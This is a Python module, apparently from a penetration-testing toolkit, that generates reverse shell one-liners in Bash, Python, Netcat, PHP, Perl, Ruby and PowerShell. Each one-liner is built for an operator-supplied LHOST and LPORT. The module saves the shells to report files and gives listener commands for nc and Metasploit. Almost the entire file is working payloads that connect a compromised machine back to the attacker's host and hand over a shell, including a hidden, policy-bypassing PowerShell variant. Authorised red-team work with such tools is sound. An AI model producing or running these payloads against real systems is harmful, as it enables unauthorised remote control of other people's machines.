#!/usr/bin/env python3
# app/exploitation/reverse_shell_gen.py - Reverse Shell Generator (Fixed)

import sys
import os
import time
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, BASE_DIR)

from config import C_OK, C_WARN, C_ERR, C_RESET, C_INFO, C_TITLE, REPORTS_DIR
from utils import Logger, pause, clear_screen, InputValidator, ReportWriter


class ReverseShellGenerator:
    def __init__(self):
        self.reports_dir = os.path.join(REPORTS_DIR, 'exploitation', 'reverse_shells')
        os.makedirs(self.reports_dir, exist_ok=True)
    
    def run(self):
        """Main Reverse Shell menu"""
        while True:
            clear_screen()
            print(f"\n{C_TITLE}╔══════════════════════════════════════════╗")
            print(f"║      REVERSE SHELL GENERATOR             ║")
            print(f"╚══════════════════════════════════════════╝{C_RESET}\n")
            
            print(f"{C_INFO}  [1]  Bash Reverse Shell{C_RESET}")
            print(f"{C_INFO}  [2]  Python Reverse Shell{C_RESET}")
            print(f"{C_INFO}  [3]  Netcat Reverse Shell{C_RESET}")
            print(f"{C_INFO}  [4]  PHP Reverse Shell{C_RESET}")
            print(f"{C_INFO}  [5]  Perl Reverse Shell{C_RESET}")
            print(f"{C_INFO}  [6]  Ruby Reverse Shell{C_RESET}")
            print(f"{C_INFO}  [7]  PowerShell Reverse Shell{C_RESET}")
            print(f"{C_INFO}  [8]  All Reverse Shells{C_RESET}")
            print(f"\n{C_WARN}  [0]  Back{C_RESET}\n")
            
            choice = InputValidator.get_choice()
            
            if choice == '0':
                return
            elif choice == '1':
                self.bash_shell()
            elif choice == '2':
                self.python_shell()
            elif choice == '3':
                self.netcat_shell()
            elif choice == '4':
                self.php_shell()
            elif choice == '5':
                self.perl_shell()
            elif choice == '6':
                self.ruby_shell()
            elif choice == '7':
                self.powershell_shell()
            elif choice == '8':
                self.all_shells()
            else:
                Logger.error("Invalid choice!")
                time.sleep(1)
    
    def get_connection_info(self):
        """Get LHOST and LPORT"""
        clear_screen()
        print(f"\n{C_TITLE}═══ CONNECTION INFORMATION ═══{C_RESET}\n")
        
        lhost = input(f"{C_INFO}Enter LHOST (your IP): {C_RESET}").strip()
        lport = input(f"{C_INFO}Enter LPORT [4444]: {C_RESET}").strip() or "4444"
        
        if not lhost:
            Logger.error("LHOST is required!")
            pause()
            return None, None
        
        return lhost, lport
    
    def bash_shell(self):
        """Bash Reverse Shell"""
        lhost, lport = self.get_connection_info()
        if not lhost:
            return
        
        shells = {
            "Bash TCP": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "Bash UDP": f"bash -i >& /dev/udp/{lhost}/{lport} 0>&1",
            "Bash exec": f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
            "Bash read line": f"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done"
        }
        
        self.display_shells("BASH REVERSE SHELLS", shells, lhost, lport)
    
    def python_shell(self):
        """Python Reverse Shell"""
        lhost, lport = self.get_connection_info()
        if not lhost:
            return
        
        shells = {
            "Python Short": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            
            "Python PTY": f"python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
            
            "Python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
        }
        
        self.display_shells("PYTHON REVERSE SHELLS", shells, lhost, lport)
    
    def netcat_shell(self):
        """Netcat Reverse Shell"""
        lhost, lport = self.get_connection_info()
        if not lhost:
            return
        
        shells = {
            "Netcat Traditional": f"nc -e /bin/sh {lhost} {lport}",
            "Netcat OpenBSD": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "Netcat Busybox": f"rm -f /tmp/p; mknod /tmp/p p && nc {lhost} {lport} 0</tmp/p | /bin/sh 1>/tmp/p",
            "Ncat": f"ncat {lhost} {lport} -e /bin/bash",
            "Ncat UDP": f"ncat --udp {lhost} {lport} -e /bin/bash"
        }
        
        self.display_shells("NETCAT REVERSE SHELLS", shells, lhost, lport)
    
    def php_shell(self):
        """PHP Reverse Shell"""
        lhost, lport = self.get_connection_info()
        if not lhost:
            return
        
        shells = {
            "PHP Exec": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            
            "PHP System": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});system(\"/bin/sh -i <&3 >&3 2>&3\");'",
            
            "PHP Passthru": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});passthru(\"/bin/sh -i <&3 >&3 2>&3\");'",
            
            "PHP Shell_exec": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        }
        
        self.display_shells("PHP REVERSE SHELLS", shells, lhost, lport)
    
    def perl_shell(self):
        """Perl Reverse Shell"""
        lhost, lport = self.get_connection_info()
        if not lhost:
            return
        
        shells = {
            "Perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            
            "Perl Windows": f"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{lhost}:{lport}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
        }
        
        self.display_shells("PERL REVERSE SHELLS", shells, lhost, lport)
    
    def ruby_shell(self):
        """Ruby Reverse Shell"""
        lhost, lport = self.get_connection_info()
        if not lhost:
            return
        
        shells = {
            "Ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            
            "Ruby Windows": f"ruby -rsocket -e 'c=TCPSocket.new(\"{lhost}\",\"{lport}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
        }
        
        self.display_shells("RUBY REVERSE SHELLS", shells, lhost, lport)
    
    def powershell_shell(self):
        """PowerShell Reverse Shell"""
        lhost, lport = self.get_connection_info()
        if not lhost:
            return
        
        shells = {
            "PowerShell One-liner": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
            
            "PowerShell Base64": f"powershell -e <BASE64_ENCODED_COMMAND>"
        }
        
        self.display_shells("POWERSHELL REVERSE SHELLS", shells, lhost, lport)
    
    def all_shells(self):
        """Display all reverse shells"""
        lhost, lport = self.get_connection_info()
        if not lhost:
            return
        
        clear_screen()
        print(f"\n{C_TITLE}═══ ALL REVERSE SHELLS ═══{C_RESET}\n")
        print(f"{C_INFO}LHOST: {lhost}{C_RESET}")
        print(f"{C_INFO}LPORT: {lport}{C_RESET}\n")
        
        all_shells = {}
        
        # Bash
        all_shells["Bash TCP"] = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        
        # Python
        all_shells["Python"] = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        
        # Netcat
        all_shells["Netcat"] = f"nc -e /bin/sh {lhost} {lport}"
        
        # PHP
        all_shells["PHP"] = f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        
        # Perl
        all_shells["Perl"] = f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        
        # Ruby
        all_shells["Ruby"] = f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        
        report_content = f"""ALL REVERSE SHELLS
{'='*80}
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
LHOST: {lhost}
LPORT: {lport}
{'='*80}

"""
        
        for name, shell in all_shells.items():
            print(f"{C_OK}[{name}]{C_RESET}")
            print(f"{shell}\n")
            report_content += f"[{name}]\n{shell}\n\n"
        
        report_content += f"""{'='*80}

LISTENER SETUP:
To receive the reverse shell, run:
nc -lvnp {lport}

Or use Metasploit:
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit"

{'='*80}
"""
        
        # Save report to correct directory
        timestamp = ReportWriter.get_timestamp()
        report_file = os.path.join(self.reports_dir, f"reverse_shells_all_{timestamp}.txt")
        
        with open(report_file, 'w') as f:
            f.write(report_content)
        
        Logger.success(f"Report saved: {report_file}")
        
        pause()
    
    def display_shells(self, title, shells, lhost, lport):
        """Display shells and save report"""
        clear_screen()
        print(f"\n{C_TITLE}═══ {title} ═══{C_RESET}\n")
        print(f"{C_INFO}LHOST: {lhost}{C_RESET}")
        print(f"{C_INFO}LPORT: {lport}{C_RESET}\n")
        
        report_content = f"""{title}
{'='*80}
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
LHOST: {lhost}
LPORT: {lport}
{'='*80}

"""
        
        for name, shell in shells.items():
            print(f"{C_OK}[{name}]{C_RESET}")
            print(f"{shell}\n")
            report_content += f"[{name}]\n{shell}\n\n"
        
        report_content += f"""{'='*80}

LISTENER SETUP:
To receive the reverse shell, run:
nc -lvnp {lport}

Or use Metasploit:
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit"

{'='*80}
"""
        
        # Save report to correct directory
        timestamp = ReportWriter.get_timestamp()
        shell_type = title.lower().replace(" ", "_")
        report_file = os.path.join(self.reports_dir, f"{shell_type}_{timestamp}.txt")
        
        with open(report_file, 'w') as f:
            f.write(report_content)
        
        Logger.success(f"Report saved: {report_file}")
        
        pause()


if __name__ == "__main__":
    generator = ReverseShellGenerator()
    generator.run()